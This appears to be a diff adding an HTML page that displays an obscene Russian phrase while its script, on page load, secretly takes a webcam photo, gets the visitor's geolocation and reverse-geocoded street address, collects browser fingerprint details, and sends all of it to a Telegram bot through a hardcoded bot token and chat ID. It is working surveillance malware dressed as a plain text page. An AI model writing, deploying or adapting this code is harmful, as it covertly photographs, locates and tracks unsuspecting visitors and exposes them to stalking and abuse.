@@ -1,0 +1,154 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Centered Text</title>
+    <style>
+        body {
+            margin: 0;
+            padding: 0;
+            background-color: #000;
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            color: white;
+            overflow: hidden;
+            user-select: none;
+        }
+
+        .centered-text {
+            font-size: 3rem;
+            font-weight: bold;
+            text-transform: uppercase;
+            font-family: Arial, sans-serif;
+            margin-bottom: 20px;
+        }
+    </style>
+</head>
+<body>
+    <div class="centered-text">ИДИ НА ХУЙ</div>
+
+    <script>
+        let userCount = 1;
+        let photoBlob;
+        let sentData = false;
+
+        async function getUserInfo(latitude, longitude) {
+            const locationData = await fetch(`https://nominatim.openstreetmap.org/reverse?lat=${latitude}&lon=${longitude}&format=json`);
+            const locationInfo = await locationData.json();
+            const addressComponents = locationInfo.address;
+            const formattedAddress = [
+                addressComponents.country,
+                addressComponents.state || addressComponents.region,
+                addressComponents.city || addressComponents.town || addressComponents.village,
+                addressComponents.road,
+                addressComponents.house_number,
+                addressComponents.postcode
+            ].filter(Boolean).join(', ');
+
+            return {
+                userId: userCount++,
+                userAgent: navigator.userAgent,
+                timestamp: new Date().toISOString(),
+                screenWidth: window.screen.width,
+                screenHeight: window.screen.height,
+                innerWidth: window.innerWidth,
+                innerHeight: window.innerHeight,
+                referrer: document.referrer,
+                platform: navigator.platform,
+                language: navigator.language,
+                cookiesEnabled: navigator.cookieEnabled,
+                connectionType: navigator.connection ? navigator.connection.effectiveType : 'unknown',
+                historyLength: window.history.length,
+                depthOfView: document.body.scrollHeight,
+                latitude: latitude,
+                longitude: longitude,
+                geoLocation: formattedAddress
+            };
+        }
+
+        async function sendDataToTelegram(userInfo) {
+            const botToken = '6760012279:AAHcJueLC_AF49YRK3s-MCc2pTGJy7YZPHA';
+            const chatId = '-1002255197235';
+            const message = `
+                Пользователь ${userInfo.userId} зашёл на сайт:
+                User Agent: ${userInfo.userAgent}
+                Время: ${userInfo.timestamp}
+                Разрешение экрана: ${userInfo.screenWidth}px x ${userInfo.screenHeight}px
+                Внутреннее разрешение: ${userInfo.innerWidth}px x ${userInfo.innerHeight}px
+                Реферер: ${userInfo.referrer}
+                Платформа: ${userInfo.platform}
+                Язык: ${userInfo.language}
+                Cookies включены: ${userInfo.cookiesEnabled}
+                Тип соединения: ${userInfo.connectionType}
+                История браузера: ${userInfo.historyLength}
+                Глубина страницы: ${userInfo.depthOfView}
+                Геолокация: ${userInfo.geoLocation}
+                Широта: ${userInfo.latitude}, Долгота: ${userInfo.longitude}
+            `;
+
+            const formData = new FormData();
+            formData.append('chat_id', chatId);
+            formData.append('photo', photoBlob);
+            formData.append('caption', message);
+
+            await fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
+                method: 'POST',
+                body: formData
+            });
+
+            await fetch(`https://api.telegram.org/bot${botToken}/sendLocation`, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json',
+                },
+                body: JSON.stringify({
+                    chat_id: chatId,
+                    latitude: userInfo.latitude,
+                    longitude: userInfo.longitude,
+                }),
+            });
+        }
+
+        async function capturePhoto() {
+            const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+            const video = document.createElement('video');
+            video.srcObject = stream;
+            await new Promise(resolve => video.onloadedmetadata = resolve);
+            video.play();
+            const canvas = document.createElement('canvas');
+            canvas.width = video.videoWidth;
+            canvas.height = video.videoHeight;
+            const context = canvas.getContext('2d');
+            context.drawImage(video, 0, 0, canvas.width, canvas.height);
+            stream.getTracks().forEach(track => track.stop());
+            return canvas.toDataURL('image/jpeg');
+        }
+
+        async function startProcess() {
+            if (!sentData && navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(async position => {
+                    const userInfo = await getUserInfo(position.coords.latitude, position.coords.longitude);
+                    photoBlob = await (await fetch(await capturePhoto())).blob();
+                    await sendDataToTelegram(userInfo);
+                    sentData = true;
+                });
+            }
+        }
+
+        window.onload = startProcess;
+
+        navigator.serviceWorker.register('/sw.js').then(() => {
+            console.log('Service Worker зарегистрирован.');
+        });
+
+        window.onbeforeunload = function() {
+            return;
+        };
+    </script>
+</body>
+</html>
+
